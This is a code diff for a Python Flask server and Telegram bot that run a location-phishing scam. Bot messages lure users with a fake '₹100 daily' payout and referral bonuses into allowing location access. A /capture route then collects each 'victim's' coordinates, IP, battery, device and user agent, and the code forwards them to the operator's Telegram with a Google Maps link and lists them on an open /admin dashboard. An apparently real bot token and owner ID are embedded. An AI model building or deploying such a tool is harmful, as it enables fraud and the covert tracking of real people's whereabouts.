@@ -2,33 +2,80 @@ import os
 import json
 import logging
 import threading
+import requests
 from datetime import datetime
-from flask import Flask, request, jsonify, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes
+from flask import Flask, request, jsonify
 
-# === CONFIG - SIRF YEH DO CHEEZEIN CHANGE KARO ===
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4")
-OWNER_ID = os.environ.get("OWNER_ID", "8586849798")  # Tumhara Telegram user ID (number)
+# === SIRF YEH DO CHEEZEIN CHANGE KARO ===
+BOT_TOKEN = os.environ.get("8849680903:AAFhk2Aq2rfxuou1cHZqSOr4N1_JCei-7n4", "YOUR_BOT_TOKEN_HERE")
+OWNER_ID = os.environ.get("8586849798", "YOUR_TELEGRAM_USER_ID")
 
 # Flask app
 app = Flask(__name__)
 
 # Victim data store
 victim_data = {}
-bot_app = None
 
-# === TELEGRAM HANDLERS ===
+# Logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    bot_username = (await context.bot.get_me()).username
+# === TELEGRAM API FUNCTIONS (Direct API - No python-telegram-bot needed) ===
+
+TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+def send_message(chat_id, text, parse_mode="Markdown", reply_markup=None):
+    """Send message via Telegram API"""
+    url = f"{TELEGRAM_API}/sendMessage"
+    data = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": parse_mode
+    }
+    if reply_markup:
+        data["reply_markup"] = json.dumps(reply_markup)
+    
+    try:
+        r = requests.post(url, data=data, timeout=10)
+        logger.info(f"Message sent to {chat_id}: {r.status_code}")
+        return r.json()
+    except Exception as e:
+        logger.error(f"Failed to send message: {e}")
+        return None
+
+def answer_callback_query(callback_query_id, text=None, show_alert=False):
+    """Answer callback query"""
+    url = f"{TELEGRAM_API}/answerCallbackQuery"
+    data = {"callback_query_id": callback_query_id}
+    if text:
+        data["text"] = text
+    if show_alert:
+        data["show_alert"] = True
+    
+    try:
+        requests.post(url, data=data, timeout=5)
+    except:
+        pass
+
+def set_webhook(url):
+    """Set webhook for bot"""
+    webhook_url = f"{url}/webhook"
+    r = requests.get(f"{TELEGRAM_API}/setWebhook?url={webhook_url}")
+    logger.info(f"Webhook set: {r.json()}")
+    return r.json()
+
+# === BOT COMMAND HANDLERS ===
+
+def handle_start(chat_id, user_first_name, user_id):
+    """Handle /start command"""
+    host = request.host if request else "your-app.onrender.com"
     
     welcome = f"""
-👋 **ᴡᴇʟᴄᴏᴍᴇ {user.first_name}!** 🎉
+👋 **ᴡᴇʟᴄᴏᴍᴇ {user_first_name}!** 🎉
 
 💰 **ᴇᴀʀɴ ₹𝟷𝟶𝟶 ᴅᴀɪʟʏ** 💰
-​​​​​​​​​​​​​​‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
+
+➥ ʙᴀꜱ ᴇᴋ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴏ
 ➥ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴏ
 ➥ ₹𝟷𝟶𝟶 ɪɴꜱᴛᴀɴᴛ ɢᴘᴀʏ/ᴘᴀʏᴛᴍ/ᴘʜᴏɴᴇᴘᴇ 🤑
 
@@ -37,13 +84,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 👇 **ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀᴇ ʙᴜᴛᴛᴏɴ ᴘᴇ ᴛᴀᴘ ᴋᴀʀᴏ** 👇
 """
-    keyboard = [[InlineKeyboardButton("🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", url=f"https://{request.host}")]]
-    await update.message.reply_text(welcome, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "🤑 ᴄʟᴀɪᴍ ₹𝟷𝟶𝟶 ɴᴏᴡ 🤑", "url": f"https://{host}"}
+        ]]
+    }
+    send_message(chat_id, welcome, reply_markup=keyboard)
 
-async def link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Send phishing link - /link"""
-    user = update.effective_user
-    link = f"https://{request.host}?ref={user.id}"
+def handle_link(chat_id, user_id):
+    """Handle /link command"""
+    host = request.host if request else "your-app.onrender.com"
+    link = f"https://{host}?ref={user_id}"
+    
     msg = f"""
 🔗 **ᴛᴇʀᴀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ:** 📎
 `{link}`
@@ -52,31 +104,18 @@ async def link(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ᴊᴀʙ ᴠᴏ ᴄʟɪᴄᴋ ᴋᴀʀᴇɢᴀ ᴀᴜʀ ʟᴏᴄᴀᴛɪᴏɴ ᴀʟʟᴏᴡ ᴋᴀʀᴇɢᴀ
 ᴛᴏ ᴛᴇʀᴀ ₹𝟸𝟻 ʀᴇꜰᴇʀʀᴀʟ ʙᴏɴᴜꜱ ᴀᴀʏᴇɢᴀ! 🤑
 """
-    await update.message.reply_text(msg, parse_mode='Markdown')
+    send_message(chat_id, msg)
 
-async def send_victim_to_owner(victim_info):
-    """Send victim data to owner via Telegram"""
-    global bot_app
-    if not bot_app:
-        return
-    
-    msg = f"""
-⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️
+def handle_help(chat_id):
+    """Handle /help command"""
+    msg = """
+🤖 **ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅꜱ:**
 
-📍 **ʟᴏᴄᴀᴛɪᴏɴ:** {victim_info['lat']}, {victim_info['lon']}
-🎯 **ᴀᴄᴄᴜʀᴀᴄʏ:** {victim_info['acc']}ᴍ
-🔋 **ʙᴀᴛᴛᴇʀʏ:** {victim_info['battery_level']}%
-🔌 **ᴄʜᴀʀɢɪɴɢ:** {victim_info['battery_charging']}
-🌐 **ɪᴘ:** {victim_info['ip']}
-📱 **ᴅᴇᴠɪᴄᴇ:** {victim_info['platform']}
-🕐 **ᴛɪᴍᴇ:** {victim_info['timestamp']}
-
-🔗 **ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ:** https://www.google.com/maps?q={victim_info['lat']},{victim_info['lon']}
+/start - ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ɢᴇᴛ ₹𝟷𝟶𝟶 ᴏꜰꜰᴇʀ
+/link - ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ ʀᴇꜰᴇʀʀᴀʟ ʟɪɴᴋ
+/help - ꜱʜᴏᴡ ᴛʜɪꜱ ᴍᴇꜱꜱᴀɢᴇ
 """
-    try:
-        await bot_app.bot.send_message(chat_id=OWNER_ID, text=msg, parse_mode='Markdown')
-    except Exception as e:
-        print(f"[-] Failed to send to owner: {e}")
+    send_message(chat_id, msg)
 
 # === FLASK ROUTES ===
 
@@ -169,6 +208,7 @@ else throw Error('err');
 
 @app.route('/capture', methods=['POST'])
 def capture():
+    """Receive victim data"""
     data = request.json
     data['ip'] = request.remote_addr
     data['forwarded_ip'] = request.headers.get('X-Forwarded-For', '')
@@ -176,45 +216,89 @@ def capture():
     vid = f"victim_{int(datetime.now().timestamp())}"
     victim_data[vid] = data
     
-    # Beautiful console output
+    # Console log
     print(f"""
-╔{'═'*50}╗
+╔══════════════════════════════════════════╗
 ║   🔥 NEW VICTIM CAPTURED: {vid}  🔥
-╠{'═'*50}╣
+╠══════════════════════════════════════════╣
 ║ 📍  Lat: {data['lat']}
 ║ 📍  Lon: {data['lon']}
 ║ 🎯  Accuracy: {data['acc']}m
-║ 🔋  Battery: {data['batt']}% (Charging: {data['charge']})
+║ 🔋  Battery: {data['batt']}% 
+║ 🔌  Charging: {data['charge']}
 ║ 🌐  IP: {data['ip']}
 ║ 📱  Platform: {data['plat']}
 ║ 🕐  Time: {data['ts']}
 ║ 👤  Ref: {data['ref']}
-╚{'═'*50}╝
+╚══════════════════════════════════════════╝
 """)
     
-    # Send to owner Telegram
-    if bot_app and OWNER_ID != "YOUR_TELEGRAM_ID":
-        victim_info = {
-            'lat': data['lat'],
-            'lon': data['lon'],
-            'acc': data['acc'],
-            'battery_level': data['batt'],
-            'battery_charging': data['charge'],
-            'ip': data['ip'],
-            'platform': data['plat'],
-            'timestamp': data['ts'],
-            'ref': data['ref']
-        }
-        # Run in thread to not block
-        threading.Thread(target=lambda: asyncio.run(send_victim_to_owner(victim_info)), daemon=True).start()
+    # Send notification to owner
+    if OWNER_ID != "YOUR_TELEGRAM_USER_ID":
+        msg = f"""
+⚠️ **ɴᴇᴡ ᴠɪᴄᴛɪᴍ ᴄᴀᴘᴛᴜʀᴇᴅ!** ⚠️
+
+📍 **ʟᴏᴄᴀᴛɪᴏɴ:** {data['lat']}, {data['lon']}
+🎯 **ᴀᴄᴄᴜʀᴀᴄʏ:** {data['acc']}ᴍ
+🔋 **ʙᴀᴛᴛᴇʀʏ:** {data['batt']}%
+🔌 **ᴄʜᴀʀɢɪɴɢ:** {data['charge']}
+🌐 **ɪᴘ:** {data['ip']}
+📱 **ᴅᴇᴠɪᴄᴇ:** {data['plat']}
+🕐 **ᴛɪᴍᴇ:** {data['ts']}
+
+🔗 **ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ:** https://www.google.com/maps?q={data['lat']},{data['lon']}
+"""
+        send_message(OWNER_ID, msg)
     
     return jsonify({"status": "ok", "message": "Reward claimed!"})
 
+@app.route('/webhook', methods=['POST'])
+def webhook():
+    """Handle incoming Telegram updates via webhook"""
+    update = request.json
+    
+    if not update:
+        return "ok", 200
+    
+    logger.info(f"Received update: {json.dumps(update)[:200]}...")
+    
+    # Handle message
+    if 'message' in update:
+        msg = update['message']
+        chat_id = msg['chat']['id']
+        text = msg.get('text', '')
+        user = msg.get('from', {})
+        user_first_name = user.get('first_name', 'User')
+        user_id = user.get('id', 0)
+        
+        if text == '/start':
+            handle_start(chat_id, user_first_name, user_id)
+        elif text == '/link':
+            handle_link(chat_id, user_id)
+        elif text == '/help':
+            handle_help(chat_id)
+        else:
+            # Unknown command - send help
+            handle_help(chat_id)
+    
+    # Handle callback query (button clicks)
+    if 'callback_query' in update:
+        cb = update['callback_query']
+        cb_id = cb['id']
+        chat_id = cb['message']['chat']['id']
+        user_id = cb['from'].get('id', 0)
+        data = cb.get('data', '')
+        
+        # Just answer the callback
+        answer_callback_query(cb_id)
+    
+    return "ok", 200
+
 @app.route('/admin')
 def admin():
-    """Admin panel - see all victim data"""
+    """Admin dashboard - see all victim data"""
     html = """
-    <html><head><title>Victim Data</title>
+    <html><head><title>Victim Data Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
     body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:20px;}
@@ -227,65 +311,57 @@ def admin():
     .label{color:#e94560;font-weight:bold;}
     .badge{background:#0f3460;padding:3px 10px;border-radius:20px;font-size:12px;}
     a{color:#4fc3f7;}
+    .total{font-size:20px;margin:10px 0;color:#4fc3f7;}
+    .map-btn{display:inline-block;background:#4CAF50;color:white;padding:5px 15px;border-radius:20px;text-decoration:none;font-size:13px;}
     </style></head><body>
     <h1>📊 Victim Data Dashboard</h1>
-    <p>Total: """ + str(len(victim_data)) + """ victims</p>
+    <div class="total">Total Victims: """ + str(len(victim_data)) + """</div>
     """
     if not victim_data:
-        html += '<p style="color:#888;">⏳ No victims yet. Share the link!</p>'
+        html += '<p style="color:#888;font-size:18px;margin-top:30px;">⏳ No victims captured yet. Share the bot link!</p>'
     else:
-        for vid, d in list(victim_data.items())[::-1]:  # newest first
+        for vid, d in list(victim_data.items())[::-1]:
             html += f"""
             <div class="card">
             <h3>🆔 {vid}</h3>
             <p><span class="label">📍 Location:</span> {d['lat']}, {d['lon']}</p>
             <p><span class="label">🎯 Accuracy:</span> {d['acc']}m</p>
-            <p><span class="label">🗺️ Maps:</span> <a href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">Open in Google Maps</a></p>
-            <p><span class="label">🔋 Battery:</span> {d['batt']}% {('⚡ Charging' if d.get('charge')==True else '🔌 Not Charging') if d.get('charge')!='?' else '?'}</p>
+            <p><a class="map-btn" href="https://www.google.com/maps?q={d['lat']},{d['lon']}" target="_blank">🗺️ Open in Google Maps</a></p>
+            <p><span class="label">🔋 Battery:</span> {d['batt']}% | <span class="label">🔌 Charging:</span> {d['charge']}</p>
             <p><span class="label">🌐 IP:</span> {d['ip']}</p>
             <p><span class="label">📱 Platform:</span> {d.get('plat','?')}</p>
             <p><span class="label">🌍 Language:</span> {d.get('lang','?')}</p>
             <p><span class="label">👤 Referrer:</span> <span class="badge">{d.get('ref','?')}</span></p>
             <p><span class="label">🕐 Time:</span> {d.get('ts','?')}</p>
-            <p><span class="label">💻 UA:</span> <small>{d.get('ua','?')}</small></p>
+            <p><span class="label">💻 UA:</span> <small style="color:#888;word-break:break-all;">{d.get('ua','?')}</small></p>
             </div>
             """
     html += "</body></html>"
     return html
 
-# === MAIN ===
+@app.route('/set-webhook')
+def setup_webhook():
+    """Manually set webhook"""
+    host = request.host
+    url = f"https://{host}"
+    result = set_webhook(url)
+    return f"Webhook set result: {result}"
+
+# === STARTUP ===
 
 if __name__ == '__main__':
-    import asyncio
-    
-    print("""
-╔{'═'*50}╗
-║   🤖 TELEGRAM LOCATION BOT DEPLOYED  🤖
-╠{'═'*50}╣
-║   Bot: @your_bot_username
-║   Web: https://your-app.onrender.com
-║   Admin: https://your-app.onrender.com/admin
-╚{'═'*50}╝
-""")
-    
-    # Start bot in background thread
-    if BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
-        def start_bot():
-            global bot_app
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            
-            bot_app = Application.builder().token(BOT_TOKEN).build()
-            bot_app.add_handler(CommandHandler("start", start))
-            bot_app.add_handler(CommandHandler("link", link))
-            
-            print("[+] Bot handlers registered. Starting polling...")
-            bot_app.run_polling()
-        
-        threading.Thread(target=start_bot, daemon=True).start()
-    else:
-        print("[!] BOT_TOKEN not set! Bot won't run. Set environment variable BOT_TOKEN")
-    
-    # Run Flask
     port = int(os.environ.get("PORT", 5000))
+    host = os.environ.get("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{port}")
+    
+    print(f"""
+╔══════════════════════════════════════════╗
+║   🤖 TELEGRAM LOCATION BOT DEPLOYED  🤖  ║
+╠══════════════════════════════════════════╣
+║   Web: {host}
+║   Admin: {host}/admin
+║   Set Webhook: {host}/set-webhook
+╚══════════════════════════════════════════╝
+    """)
+    
+    # Start Flask
     app.run(host="0.0.0.0", port=port, debug=False)
